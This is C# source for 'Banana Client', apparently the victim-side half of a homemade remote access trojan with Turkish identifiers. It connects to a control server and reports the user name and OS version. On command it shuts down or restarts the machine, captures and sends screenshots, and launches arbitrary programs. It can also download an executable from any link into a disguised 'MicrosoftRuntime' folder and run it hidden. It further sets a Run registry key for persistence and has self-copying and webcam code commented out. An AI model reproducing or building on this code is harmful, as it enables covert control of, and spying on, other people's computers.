using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Mime;
using System.Reflection;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using WatsonTcp;

namespace Banana_Client
{
    class Program
    {
        public static WatsonTcpClient client = new WatsonTcpClient("127.0.0.1", 13909);

        static void Main(string[] args)
        {
            Thread.Sleep(1000);

            yerles();

            Thread.Sleep(5000);
            
            client.Events.ServerConnected += ServerConnected;
            client.Events.ServerDisconnected += ServerDisconnected;
            client.Events.MessageReceived += MessageReceived;

            dene:
            try
            {
                Console.WriteLine("Bağlanılıyor...");
                client.Connect();
                Thread.Sleep(5000);
            }
            catch
            {
                Console.WriteLine("Bağlanılamadı. Tekrar Deneniyor...");
                goto dene;
            }

            client.Send("ekle:" + System.Security.Principal.WindowsIdentity.GetCurrent().Name + ":" + Environment.OSVersion.VersionString);

            Console.ReadLine();
        }

        public static void MessageReceived(object sender, MessageReceivedEventArgs args)
        {
            string mesaj = Encoding.UTF8.GetString(args.Data);
            Console.WriteLine("Mesaj: " + args.IpPort + ": " + mesaj);

            string[] parcalar = mesaj.Split(':');

            if (mesaj == "kapat")
            {
                Console.WriteLine("kapatılıyor...");

                var psi = new ProcessStartInfo("shutdown", "/s /t 0");
                psi.CreateNoWindow = true;
                psi.UseShellExecute = false;
                Process.Start(psi);
            }

            if (parcalar[0] == "messagebox")
            {
                if (parcalar[3] == "Error")
                {
                    MessageBox.Show(parcalar[2], parcalar[1], MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
                if (parcalar[3] == "Ünlem")
                {
                    MessageBox.Show(parcalar[2], parcalar[1], MessageBoxButtons.OK, MessageBoxIcon.Warning);
                }
                if (parcalar[3] == "Bilgi")
                {
                    MessageBox.Show(parcalar[2], parcalar[1], MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
            }

            if (parcalar[0] == "masaustugonder")
            {
                masaustu(parcalar[1], parcalar[2]);
            }

            if (mesaj == "baglantiyikes")
            {
                Console.WriteLine("Bağlantı Kesiliyor...");
                Environment.Exit(0);
            }

            if (mesaj == "yenidenbaslat")
            {
                var psi = new ProcessStartInfo("shutdown", "/r /t 0");
                psi.CreateNoWindow = true;
                psi.UseShellExecute = false;
                Process.Start(psi);
            }

            if (parcalar[0] == "dosya")
            {
                string[] yparcalar = mesaj.Split(' ');
                string link = parcalar[1];
                bool gizli = Convert.ToBoolean(parcalar[2]);

                string appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

                WebClient wc = new WebClient();

                if (!Directory.Exists(Path.Combine(appdata, "MicrosoftRuntime")))
                {
                    Directory.CreateDirectory(Path.Combine(appdata, "MicrosoftRuntime"));
                }

                

                string filename = new Random().Next(100000000, 999999999).ToString() + ".exe";

                Console.WriteLine("İndiriliyor: " + link);

                wc.DownloadFile(link, Path.Combine(appdata, "MicrosoftRuntime", filename));

                if (gizli)
                {
                    using (Process myProcess = new Process())
                    {
                        myProcess.StartInfo.UseShellExecute = false;
                        myProcess.StartInfo.FileName = Path.Combine(appdata, "MicrosoftRuntime", filename);
                        myProcess.StartInfo.CreateNoWindow = true;
                        myProcess.Start();
                    }
                }
                else
                {
                    Process.Start(Path.Combine(appdata, "MicrosoftRuntime", filename));
                }
            }

            if (parcalar[0] == "baslat")
            {
                string[] parcalar2 = mesaj.Split(new char[] { ':' }, 2, StringSplitOptions.None);

                try
                {
                    Process.Start(parcalar2[1]);
                }
                catch
                {

                }
            }

            /*
            if (mesaj == "kamera")
            {
                Image<Bgr, Byte> image = capture.QueryFrame().ToImage<Bgr, Byte>();

                client.Send(image.ToJpegData());
            }
            */
        }

        public static void masaustu(string x, string y)
        {
            Bitmap bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
            using (Graphics g = Graphics.FromImage(bmp))
            {
                g.CopyFromScreen(0, 0, 0, 0, Screen.PrimaryScreen.Bounds.Size);
            }

            Image img = (Image)bmp;

            Bitmap resized = new Bitmap(Convert.ToInt32(x), Convert.ToInt32(y));

            using (Graphics g = Graphics.FromImage(resized))
            {
                g.DrawImage(img, 0, 0, Convert.ToInt32(x), Convert.ToInt32(y));
            }

            ImageConverter imgCon = new ImageConverter();

            byte[] rarray = (byte[])imgCon.ConvertTo((Image)resized, typeof(byte[]));

            /*
            string resimbase64 = Convert.ToBase64String(rarray);

            client.Send("masaustu:" + resimbase64);
            */

            client.Send(rarray);
        }

        static void ServerConnected(object sender, EventArgs args)
        {
            Console.WriteLine("Server connected");
        }

        static void ServerDisconnected(object sender, EventArgs args)
        {
            Console.WriteLine("Server disconnected");
            //goto dene;
        }

        public static void yerles()
        {

            string appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

            /*
            if (Assembly.GetEntryAssembly().Location != Path.Combine(appdata, "MicrosoftRuntime", "Banana Client.exe"))
            {
                if (!File.Exists(Path.Combine(appdata, "MicrosoftRuntime", "Banana Client.exe")))
                {
                    Process[] prosesler = Process.GetProcesses();

                    foreach (Process pr in prosesler)
                    {
                        if (pr.ProcessName == "Banana Client")
                        {
                            if (pr.Id != Process.GetCurrentProcess().Id)
                            {
                                pr.Kill();
                            }
                        }
                    }

                    if (!Directory.Exists(Path.Combine(appdata, "MicrosoftRuntime")))
                    {
                        Directory.CreateDirectory(Path.Combine(appdata, "MicrosoftRuntime"));
                    }

                    if (File.Exists(Path.Combine(appdata, "MicrosoftRuntime", "Banana Client.exe")))
                    {
                        File.Delete(Path.Combine(appdata, "MicrosoftRuntime", "Banana Client.exe"));
                    }

                    File.Copy(Assembly.GetEntryAssembly().Location, Path.Combine(appdata, "MicrosoftRuntime", "Banana Client.exe"));

                    SetStartup(Path.Combine(appdata, "MicrosoftRuntime", "Banana Client.exe"));

                    Process.Start(Path.Combine(appdata, "MicrosoftRuntime", "Banana Client.exe"));

                    Environment.Exit(0);
                }
                else
                {
                    Process.Start(Path.Combine(appdata, "MicrosoftRuntime", "Banana Client.exe"));
                    Environment.Exit(0);
                }
            }
            else
            {
                MessageBox.Show("bn appdatadayım");
            }
            */
            var exists = Process.GetProcessesByName(Path.GetFileNameWithoutExtension(Assembly.GetEntryAssembly().Location)).Count() > 1;

            if (exists)
            {
                Environment.Exit(0);
            }

            //sanırım burda hata var
        }

        public static void SetStartup(string path)
        {
            RegistryKey rk = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            rk.SetValue("Banana Client", path);
        }
    }
}